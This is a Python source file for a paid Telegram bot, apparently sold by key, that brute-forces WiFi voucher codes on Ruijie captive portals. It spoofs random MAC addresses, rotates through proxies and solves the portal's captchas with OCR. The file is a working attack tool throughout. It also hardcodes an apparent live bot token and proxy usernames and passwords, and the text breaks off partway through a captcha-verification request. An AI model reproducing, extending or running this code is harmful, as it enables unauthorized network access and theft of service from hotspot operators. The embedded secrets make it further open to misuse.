#!/usr/bin/env python3
# ==============================================
#  Ruijie Voucher Scanner Bot  —  v8.0-FIXED-WIFIDOG
#  - Admin: @Myogyi10384 (Auto-Paid)
#  - Forward: @Myogyi10384
#  - Improved sessionId extraction for wifidog URLs
#  - Better error handling and logging
#  - Enhanced /help command
#  - FULLY WORKING COPY-PASTE
# ==============================================

import telebot
import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
import threading
import logging
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import sqlite3
from contextlib import contextmanager

# --- Logging ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ======================================================
#  🔥 CONFIGURATION — Admin & Forward = Myogyi10384
#  ⚠️ REVOKE THIS TOKEN IMMEDIATELY AND REPLACE!
# ======================================================
BOT_TOKEN = "9137803689:AAGH6oBuD7R3EBwaaUf06YFZE1dxYKZuQH8"   # <--- REVOKE THIS!
ADMIN_IDS = [ "6130147402"]
ADMIN_NAME = "Myogyi10384"
FORWARD_CHANNEL = "@Zawgyi1296"

MAX_CONCURRENT = 1000
BATCH_SIZE = 800
CONNECTION_LIMIT = 30000
CONNECTION_PER_HOST = 15000
TIMEOUT = 25
DB_PATH = "bot_data.db"

PROXY_LIST = [
    "gzsvv1pggl7k:3g9xpulazhkz2c2@65.111.5.6:3129",
    "y2g26w7t3tv4:p5ouenejkn07fvy@209.50.179.187:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.2.10:3129"
]
random.shuffle(PROXY_LIST)

# ======================================================

# --- Database (unchanged) ---
_db_conn = None
_db_lock = threading.Lock()

def get_db_connection():
    global _db_conn
    with _db_lock:
        if _db_conn is None:
            _db_conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
            _db_conn.execute("PRAGMA journal_mode=WAL")
            _db_conn.execute("PRAGMA synchronous=NORMAL")
            _db_conn.execute("PRAGMA cache_size=10000")
            _db_conn.row_factory = sqlite3.Row
        return _db_conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, user_id TEXT, plan TEXT, expires_at TEXT, code_limit INTEGER DEFAULT 1000, used_codes INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results (user_id TEXT PRIMARY KEY, codes TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, key TEXT, registered_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings (user_id TEXT PRIMARY KEY, proxy_enabled INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_checkpoints (user_id TEXT PRIMARY KEY, mode TEXT, last_code TEXT, start_digit TEXT, timestamp REAL)''')
    conn.commit()
    logger.info("Database initialized")
init_db()

# --- In-memory caches ---
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
paid_users = {}
_voucher_sem = None
_start_time = time.monotonic()
_connector = None

# --- Proxy helpers ---
_proxy_index = 0
def get_next_proxy():
    if not PROXY_LIST:
        return None
    global _proxy_index
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    if not proxy.startswith(('http://', 'https://')):
        proxy = f"http://{proxy}"
    return proxy

# --- DB Helpers (unchanged) ---
@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    except Exception as e:
        conn.rollback()
        logger.error(f"DB error: {e}")
        raise
    finally:
        pass

def db_get_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys WHERE key = ?", (key,))
        r = c.fetchone()
        return dict(r) if r else None
def db_get_user(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return dict(r) if r else None
def db_get_user_by_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE key = ?", (key,))
        r = c.fetchone()
        return dict(r) if r else None
def db_get_results(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return json.loads(r[0]) if r else []
def db_save_results(user_id, codes):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)", (user_id, json.dumps(codes)))
def db_add_user(user_id, key):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)",
                  (user_id, key, datetime.now(timezone.utc).isoformat()))
def db_add_key(key, user_id, plan, expires_at, code_limit):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, ?)",
                  (key, user_id, plan, expires_at, code_limit, 0))
def db_delete_key(key):
    with get_db_cursor() as c:
        c.execute("DELETE FROM keys WHERE key = ?", (key,))
def db_update_used_codes(key, used_codes):
    with get_db_cursor() as c:
        c.execute("UPDATE keys SET used_codes = ? WHERE key = ?", (used_codes, key))
def db_get_all_keys():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys")
        return {r[0]: dict(r) for r in c.fetchall()}
def db_get_all_users():
    with get_db_cursor() as c:
        c.execute("SELECT user_id FROM users")
        return [r[0] for r in c.fetchall()]
def db_get_proxy_setting(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return bool(r[0]) if r else True
def db_set_proxy_setting(user_id, enabled):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)",
                  (user_id, 1 if enabled else 0))
def db_get_checkpoint(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM scan_checkpoints WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return dict(r) if r else None
def db_save_checkpoint(user_id, mode, last_code, start_digit=None):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO scan_checkpoints (user_id, mode, last_code, start_digit, timestamp) VALUES (?, ?, ?, ?, ?)",
                  (user_id, mode, last_code, start_digit, time.time()))
def db_clear_checkpoint(user_id):
    with get_db_cursor() as c:
        c.execute("DELETE FROM scan_checkpoints WHERE user_id = ?", (user_id,))

def check_key_expiration(expires_at):
    if not expires_at:
        return False
    try:
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except:
        return False
def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": timedelta(minutes=30), "1h": timedelta(hours=1), "1d": timedelta(days=1),
             "7d": timedelta(days=7), "1m": timedelta(days=30), "1y": timedelta(days=365), "unlimited": None}
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()
def generate_random_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

async def forward_to_channel(message_text, parse_mode=None):
    if not FORWARD_CHANNEL:
        return
    try:
        await bot.send_message(FORWARD_CHANNEL, message_text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"Forward error: {e}")

# ==================== KEYBOARDS (List & Compact Style) ====================
def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=1)
    if user_id:
        proxy_enabled = db_get_proxy_setting(user_id)
        proxy_text = "⚡ Proxy: OFF" if not proxy_enabled else "⚡ Proxy: ON"
        proxy_callback = "menu_proxy_off" if proxy_enabled else "menu_proxy_on"
    else:
        proxy_text = "⚡ Proxy: ON"
        proxy_callback = "menu_proxy_off"
    keyboard.add(
        InlineKeyboardButton("🔑 Paid User ထည့်ရန်", callback_data="menu_paid"),
        InlineKeyboardButton("🌐 Portal URL သတ်မှတ်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
        InlineKeyboardButton("📂 Success Codes ကြည့်ရန်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck Codes", callback_data="menu_recheck"),
        InlineKeyboardButton("⏹️ Stop Scan", callback_data="menu_stop"),
        InlineKeyboardButton("💬 ဆက်သွယ်ရန် (@askogyi)", url="https://t.me/askogyi"),
        InlineKeyboardButton("◀️ နောက်သို့", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("DIGIT 6 (0-9)", callback_data="scan_6"),
        InlineKeyboardButton("DIGIT 7 (0-9)", callback_data="scan_7"),
        InlineKeyboardButton("DIGIT 8 (0-9)", callback_data="scan_8"),
        InlineKeyboardButton("ENG small 6 (a-z)", callback_data="scan_engsmall6"),
        InlineKeyboardButton("ENG small 7 (a-z)", callback_data="scan_engsmall7"),
        InlineKeyboardButton("ENG small 8 (a-z)", callback_data="scan_engsmall8"),
        InlineKeyboardButton("MIXED 6 (a-z0-9)", callback_data="scan_engmixed6"),
        InlineKeyboardButton("MIXED 7 (a-z0-9)", callback_data="scan_engmixed7"),
        InlineKeyboardButton("MIXED 8 (a-z0-9)", callback_data="scan_engmixed8"),
        InlineKeyboardButton("Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("Random Start", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("Start Scan", callback_data="menu_start_scam"), InlineKeyboardButton("Back", callback_data="menu_back"))
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("Enter Key", callback_data="menu_enter_key"), InlineKeyboardButton("Back", callback_data="menu_back"))
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("Stop Scan", callback_data="menu_stop"), InlineKeyboardButton("Back", callback_data="menu_back"))
    return keyboard

def get_admin_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("Generate Key", callback_data="admin_genkey"),
        InlineKeyboardButton("Delete Key", callback_data="admin_delkey"),
        InlineKeyboardButton("List Keys", callback_data="admin_listkeys"),
        InlineKeyboardButton("Bot Stats", callback_data="admin_stats"),
        InlineKeyboardButton("Broadcast", callback_data="admin_broadcast"),
        InlineKeyboardButton("Users List", callback_data="admin_users"),
        InlineKeyboardButton("Back to Menu", callback_data="admin_back")
    )
    return keyboard

def get_admin_genkey_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("30m", callback_data="admin_gen_30m"),
        InlineKeyboardButton("1h", callback_data="admin_gen_1h"),
        InlineKeyboardButton("1d", callback_data="admin_gen_1d"),
        InlineKeyboardButton("7d", callback_data="admin_gen_7d"),
        InlineKeyboardButton("1m", callback_data="admin_gen_1m"),
        InlineKeyboardButton("1y", callback_data="admin_gen_1y"),
        InlineKeyboardButton("Unlimited", callback_data="admin_gen_unlimited"),
        InlineKeyboardButton("Back", callback_data="admin_back")
    )
    return keyboard

def get_admin_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("Back to Admin Panel", callback_data="admin_back"))
    return keyboard

# ==================== BOT INSTANCE ====================
bot = AsyncTeleBot(BOT_TOKEN)

# ==================== HELP COMMAND ====================
@bot.message_handler(commands=['help'])
async def help_command(message):
    user_id = str(message.chat.id)
    help_text = f"""Help Guide — {ADMIN_NAME} Bot

Welcome to STAR LINK CODE HACK Bot!

Commands for Users:
/start -> Main Menu
/key [your_key] -> Register as PAID USER
/portal [portal_url] -> Set your Portal URL
/scan [mode] -> Start scan
/stop -> Stop current scan
/result -> View your saved success codes
/recheck -> Recheck your saved codes
/proxy -> Toggle proxy ON/OFF
/help -> Show this help

Admin: {ADMIN_NAME}
Your ID: `{user_id}`
"""
    await bot.reply_to(message, help_text, parse_mode="Markdown")

# ==================== START COMMAND (List & Compact Style) ====================
@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    if is_admin(user_id):
        approve[message.chat.id] = True
        paid_users[user_id] = True
        status_text = "PAID USER (Admin)"
    else:
        user_info = db_get_user(user_id)
        status_text = "Unregistered"
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info and check_key_expiration(key_info["expires_at"]):
                approve[message.chat.id] = True
                paid_users[user_id] = True
                status_text = "PAID USER"
    
    proxy_status = "ON" if db_get_proxy_setting(user_id) else "OFF"
    
    welcome_text = f"""🤖 STAR LINK SCANNER
────────────────────
• ID: `{user_id}`
• Status: {status_text}
• Proxy: {proxy_status}
────────────────────
အောက်ပါမီနူးမှ ရွေးချယ်ပါ -"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id), parse_mode="Markdown")
    await forward_to_channel(f"🆕 New User Started\n\nName: {user_name}\nID: {user_id}\n{'✅ ADMIN' if is_admin(user_id) else '❌ User'}")

# ==================== ADMIN PANEL ====================
@bot.message_handler(commands=['admin'])
async def admin_panel(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "❌ သင် Admin မဟုတ်ပါ။")
        return
    text = f"Admin Panel ({ADMIN_NAME})\n\nSelect an option below:"
    await bot.reply_to(message, text, reply_markup=get_admin_main_keyboard())

# ==================== KEY COMMAND ====================
@bot.message_handler(commands=['key'])
async def handle_key(message):
    user_id = str(message.chat.id)
    if is_admin(user_id):
        await bot.reply_to(message, "✅ သင်သည် Admin ဖြစ်ပါသည်။ KEY မလိုအပ်ပါ။")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Enter your key:\n\n/key [your_key]")
        return
    key = args[1].strip()
    key_info = db_get_key(key)
    if not key_info:
        await bot.reply_to(message, "❌ Invalid Key.")
        return
    if not check_key_expiration(key_info["expires_at"]):
        await bot.reply_to(message, "❌ Key has expired.")
        return
    db_add_user(user_id, key)
    approve[message.chat.id] = True
    paid_users[user_id] = True
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    await bot.reply_to(message, f"✅ Successfully registered as PAID USER.\nPlan: {key_info['plan']}")
    await forward_to_channel(f"✅ New User Registered\nID: {user_id}\nKey: {key}")

# ==================== GENKEY, DELKEY, SENDALL ====================
@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(str(message.chat.id)):
        return
    try:
        args = message.text.split()
        if len(args) < 4:
            await bot.reply_to(message, "Usage:\n/genkey [plan] [code_limit] [user_id]")
            return
        plan, code_limit, user_id = args[1], int(args[2]), args[3]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "❌ Invalid plan.")
            return
        new_key = generate_random_key(12)
        db_add_key(new_key, user_id, plan, expiry, code_limit)
        await bot.reply_to(message, f"✅ Key Generated:\n`{new_key}`", parse_mode="Markdown")
        try:
            await bot.send_message(int(user_id), f"🔑 Your Key:\n`{new_key}`\nUse: `/key {new_key}`", parse_mode="Markdown")
        except:
            pass
    except Exception as e:
        logger.error(f"genkey error: {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(str(message.chat.id)):
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /delkey [key]")
        return
    key = args[1]
    db_delete_key(key)
    await bot.reply_to(message, f"✅ Key deleted: {key}")

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if not is_admin(str(message.chat.id)):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        return
    users = db_get_all_users()
    for uid in users:
        try:
            await bot.send_message(int(uid), f"📢 Announcement:\n\n{args[1]}")
            await asyncio.sleep(0.1)
        except:
            continue
    await bot.reply_to(message, "✅ Broadcast sent.")

# ==================== PORTAL COMMAND ====================
@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    if is_admin(user_id):
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(message, "Usage: /portal [url]")
            return
        user_data.setdefault(message.chat.id, {})['session_url'] = args[1]
        await bot.reply_to(message, "✅ Portal URL saved (Admin).", reply_markup=get_voucher_keyboard())
        return

    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "❌ Access denied. Please register.")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /portal [url]")
        return
    url = args[1]
    await bot.reply_to(message, "Validating Portal URL...")
    if await check_session_url(url, use_proxy=db_get_proxy_setting(user_id)):
        user_data.setdefault(message.chat.id, {})['session_url'] = url
        await bot.reply_to(message, "✅ Portal URL saved successfully.", reply_markup=get_voucher_keyboard())
    else:
        await bot.reply_to(message, "❌ Invalid Portal URL.")

async def check_session_url(session_url, use_proxy=True):
    headers = {'user-agent': 'Mozilla/5.0'}
    proxy = get_next_proxy() if use_proxy and PROXY_LIST else None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy, timeout=15) as resp:
                if resp.status >= 400:
                    return False
                final_url = str(resp.url)
                keywords = ['sessionId', 'portal', 'maccauth', 'wifidog', 'gw_id', 'gw_sn']
                return any(k in final_url for k in keywords) or resp.status == 200
    except:
        return False

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, mac)
    headers = {'user-agent': 'Mozilla/5.0'}
    try:
        if 'sessionId=' in url:
            match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', url)
            if match:
                return match.group(1)
        async with session.get(url, headers=headers, allow_redirects=True) as req:
            match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', str(req.url))
            if match:
                return match.group(1)
            return previous_session_id
    except:
        return previous_session_id

# ==================== SCAN, STOP, RESULT, RECHECK, PROXY ====================
@bot.message_handler(commands=['scan'])
async def handle_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Select mode using /scan [mode]", reply_markup=get_voucher_keyboard())
        return
    chat_id = message.chat.id
    user_id = str(chat_id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "❌ Access denied.")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Please set Portal URL first.")
        return
    progress_msg = await bot.send_message(chat_id, "Scanning...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(args[1], chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await send_success_file(chat_id)
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "Scan stopped.", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "No active scan.", reply_markup=get_back_keyboard())

@bot.message_handler(commands=['result'])
async def handle_result(message):
    user_id = str(message.chat.id)
    results = db_get_results(user_id)
    if results:
        code_list_str = "\n".join([f"• Code: `{c}`" for c in results])
        await bot.reply_to(message, f"Found Codes (တချက်ထိပြီး copy ကူးနိုင်ပါသည်):\n\n{code_list_str}", parse_mode="Markdown")
    else:
        await bot.reply_to(message, "No saved codes found.")

@bot.message_handler(commands=['recheck'])
async def recheck_command(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    results = db_get_results(user_id)
    if not results:
        await bot.reply_to(message, "No codes to recheck.")
        return
    await bot.reply_to(message, "Rechecking codes...")
    session_url = user_data.get(chat_id, {}).get("session_url")
    if not session_url:
        return
    recheck_list = []
    for code in results:
        recode = await perform_check(session_url, code, chat_id, recheck=True, message=message)
        if recode:
            recheck_list.append(recode)
    
    recheck_str = "\n".join([f"• Code: `{c}`" for c in recheck_list]) if recheck_list else "None valid."
    await bot.reply_to(message, f"Rechecked Done:\n\n{recheck_str}", parse_mode="Markdown")

@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    user_id = str(message.chat.id)
    current = db_get_proxy_setting(user_id)
    db_set_proxy_setting(user_id, not current)
    await bot.reply_to(message, f"Proxy status: {'ON' if not current else 'OFF'}")

# ==================== CALLBACK HANDLER ====================
@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)

    if call.data.startswith("admin_"):
        if not is_admin(user_id):
            await bot.answer_callback_query(call.id, "Unauthorized")
            return
        if call.data == "admin_back":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Admin Panel", reply_markup=get_admin_main_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_genkey":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Select Plan:", reply_markup=get_admin_genkey_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if call.data.startswith("admin_gen_"):
            plan = call.data.replace("admin_gen_", "")
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"Use: `/genkey {plan} 1000 [user_id]`", reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_listkeys":
            await bot.answer_callback_query(call.id)
            await listkeys_command(call.message)
            return
        if call.data == "admin_stats":
            await bot.answer_callback_query(call.id)
            await stats_command(call.message)
            return
        if call.data == "admin_users":
            await bot.answer_callback_query(call.id)
            await users_list_command(call.message)
            return
        return

    if call.data in ["menu_proxy_on", "menu_proxy_off"]:
        current = db_get_proxy_setting(user_id)
        db_set_proxy_setting(user_id, not current)
        proxy_status = "ON" if not current else "OFF"
        text = f"🤖 STAR LINK SCANNER\n────────────────────\n• ID: `{user_id}`\n• Proxy: {proxy_status}\n────────────────────\nအောက်ပါမီနူးမှ ရွေးချယ်ပါ -"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard(user_id), parse_mode="Markdown")
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_back":
        proxy_status = "ON" if db_get_proxy_setting(user_id) else "OFF"
        text = f"🤖 STAR LINK SCANNER\n────────────────────\n• ID: `{user_id}`\n• Proxy: {proxy_status}\n────────────────────\nအောက်ပါမီနူးမှ ရွေးချယ်ပါ -"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard(user_id), parse_mode="Markdown")
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_free_trial":
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Send portal URL using:\n/portal [url]", reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_paid":
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Send key using:\n/key [your_key]", reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_enter_key":
        await bot.send_message(chat_id, "Send key via: /key [your_key]")
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_result":
        results = db_get_results(user_id)
        if results:
            code_list_str = "\n".join([f"• Code: `{c}`" for c in results])
            text = f"Found Codes (တချက်ထိပြီး copy ကူးနိုင်ပါသည်):\n\n{code_list_str}"
        else:
            text = "No codes found."
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard(), parse_mode="Markdown")
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_recheck":
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Rechecking...", reply_markup=get_scam_button_keyboard())
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "Stopped.")
        return

    if call.data == "menu_start_scam":
        if chat_id not in user_data or 'selected_mode' not in user_data[chat_id]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Select mode first.", reply_markup=get_voucher_keyboard())
            await bot.answer_callback_query(call.id)
            return
        mode = user_data[chat_id]['selected_mode']
        progress_msg = await bot.send_message(chat_id, "Scanning started...")
        scan_id = str(uuid.uuid4())
        task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=call.message, progress_msg=progress_msg))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"Select start digit for {mode}:", reply_markup=get_digit_keyboard(mode))
            await bot.answer_callback_query(call.id)
            return
        user_data.setdefault(chat_id, {})['selected_mode'] = mode
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"Selected mode: {mode}", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        user_data.setdefault(chat_id, {})['selected_mode'] = parts[1]
        user_data[chat_id]['start_digit'] = None if parts[2] == "random" else parts[2]
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Ready to scan.", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

# ==================== ADMIN COMMAND HELPERS ====================
async def listkeys_command(message):
    keys = db_get_all_keys()
    text = "Keys List:\n" + "\n".join([f"`{k}`" for k in keys.keys()]) if keys else "No keys."
    await bot.reply_to(message, text, parse_mode="Markdown")

async def stats_command(message):
    await bot.reply_to(message, f"Active Scans: {len(scan_tasks)}\nPaid Users: {len(paid_users)}")

async def users_list_command(message):
    users = db_get_all_users()
    await bot.reply_to(message, f"Total Users: {len(users)}")

# ==================== SCANNING ENGINE FUNCTIONS ====================
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

_ocr = None
def get_ocr():
    global _ocr
    if _ocr is None:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = get_ocr()
    if ocr is None:
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = ocr.classification(buffer.tobytes())
        return result.upper()
    except:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
